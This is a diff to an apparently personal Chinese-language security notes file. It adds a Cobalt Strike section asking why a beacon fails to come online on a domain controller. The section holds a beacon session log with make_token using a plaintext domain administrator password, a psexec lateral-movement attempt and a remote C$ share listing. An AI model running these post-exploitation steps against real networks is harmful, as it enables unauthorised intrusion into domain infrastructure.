@@ -8,6 +8,29 @@
 * fmtarg ($ecx) 怎么写用ecx
 * harde_pwn libc.so.6 error
 
+### cobalt strike
+* 都有权限浏览域控，为啥不能上线？
+
+```sh
+beacon> make_token tide1\administrator 1qaz@WSX
+[*] Tasked beacon to create a token for tide1\administrator
+beacon> jump psexec DC smb
+[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_ce) on DC via Service Control Manager (\\DC\ADMIN$\cc76326.exe)
+[+] host called home, sent: 287632 bytes
+[+] Impersonated T1-COMPUTER\test
+[-] could not upload file: 53
+[-] Could not open service control manager on DC: 1722
+[-] Could not connect to pipe: 53
+beacon> ls \\192.168.61.129\C$
+[*] Tasked beacon to list files in \\192.168.61.129\C$
+[+] host called home, sent: 37 bytes
+[*] Listing: \\192.168.61.129\C$\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     06/19/2023 06:28:52   $Recycle.Bin
+          dir     06/19/2023 22:13:56   001.env.python-3.5.1-embed-amd64
+```
 ## 综合利用
 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
